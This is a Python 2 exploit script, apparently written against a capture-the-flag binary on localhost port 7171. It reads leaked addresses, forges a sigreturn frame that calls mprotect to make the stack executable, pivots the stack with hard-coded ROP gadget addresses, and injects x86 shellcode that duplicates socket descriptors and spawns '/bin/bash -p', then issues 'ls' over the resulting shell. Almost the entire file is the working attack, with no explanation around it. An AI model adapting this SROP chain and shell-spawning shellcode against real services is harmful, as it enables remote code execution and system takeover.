from socket import create_connection
import struct
import string
from Frame import SigreturnFrame

# 0x080c2812: mov esp,ecx ; ret
# 0x0804e25f: "\x5c\xc3 <==> pop esp; ret"
# 0x0805ba31: "\x81\xec\x28\x01\x00\x00 <==> sub esp, 0x128"

all_letters = string.letters[26:]
ip = "localhost"

SIGRETURN_IND = 0x08048ee3
INT_80        = 0x08056650
POP_ESP_RET   = 0x0804e25f
MOV_ESP_ECX   = 0x080c2812
SUB_ESP_128   = 0x0805ba31
JUST_EXIT     = 0x0805477b
RET           = 0x080ed798

SYS_MPROTECT  = 125
SYS_SIGRETURN = 119

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data

s = create_connection((ip, 7171))
buffer_address = recv_n_bytes(s, 4)
buffer_address = struct.unpack("<I", buffer_address)[0]
print "[+] Buffer address is", hex(buffer_address)

page = recv_n_bytes(s, 4)
page = struct.unpack("<I", page)[0]
print "[+] mmap'd page address is", hex(page)


sploit = ""
sploit += struct.pack("<I", SIGRETURN_IND)
"""
frame = SigreturnFrame(sane=False, nulls_allowed=True)

# Frame that tries to call mprotect
frame.set_regvalue("eax", SYS_MPROTECT)
frame.set_regvalue("ebx", 0xbffdf000)
frame.set_regvalue("ecx", 0x1000)
frame.set_regvalue("edx", 0x7)
frame.set_regvalue("esi", 0x0)
frame.set_regvalue("edi", 0x0)
frame.set_regvalue("ebp", 0xbffdf000)
frame.set_regvalue("eip", INT_80)
frame.set_regvalue("esp", POP_ESP_RET)
frame.set_regvalue("cs", 0x73)
#frame.set_regvalue("ss", 0x73)
frame.set_regvalue("ds", 0x73)
frame.set_regvalue("es", 0x73)
frame.set_regvalue("fs", 0x0)
frame.set_regvalue("gs", 0x0)

x = frame.get_frame()
"""

frame  = ""
frame += struct.pack("<I", 0x0) #gs
frame += struct.pack("<I", 0x0) #fs
frame += struct.pack("<I", 0x0) #es
frame += struct.pack("<I", 0x0) #ds
frame += struct.pack("<I", 0x0) #edi
frame += struct.pack("<I", 0x0) #esi
frame += struct.pack("<I", 0xbff96000) #ebp
frame += struct.pack("<I", buffer_address + 84) #esp
frame += struct.pack("<I", 0xbffff000) #ebx
frame += struct.pack("<I", 0x7) #edx
frame += struct.pack("<I", 0x10000) #ecx
frame += struct.pack("<I", SYS_MPROTECT) #eax
frame += struct.pack("<I", 0x0) #JUNK
frame += struct.pack("<I", 0x0) #JUNK
frame += struct.pack("<I", INT_80) #eip
frame += struct.pack("<I", 0x73) #cs
frame += struct.pack("<I", 0x246) #eflags
x = frame + "A" * 0
sploit += x
print "[+] Length of frame generated is", len(x)

#ss = struct.pack("<h", 0x7b) # ss probably
#sploit += ss
sploit += "AAAA\x7b\x00AA"
sploit += struct.pack("<I", 0x0) #maybe floating point value

print "[+] Offset of shellcode execve", len(sploit)
sploit += struct.pack("<I", buffer_address + 88)
#sploit += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
sploit += "\x6a\x02\x59\x31\xdb\x43\x43\x43\x43\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7"
sploit += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

# fIll up the rest of the buffer with NOPS
sploit += "\x90" * (0x208 - len(sploit))
sploit += "B" * 4                             # EBP
sploit += struct.pack("<I", POP_ESP_RET)      # Pivot stack to start of buffer
sploit += struct.pack("<I", buffer_address)   # Buffer address

print "[+] Total length of sploit is", len(sploit)
s.send(sploit)

s.send("ls\n")
print s.recv(1024)
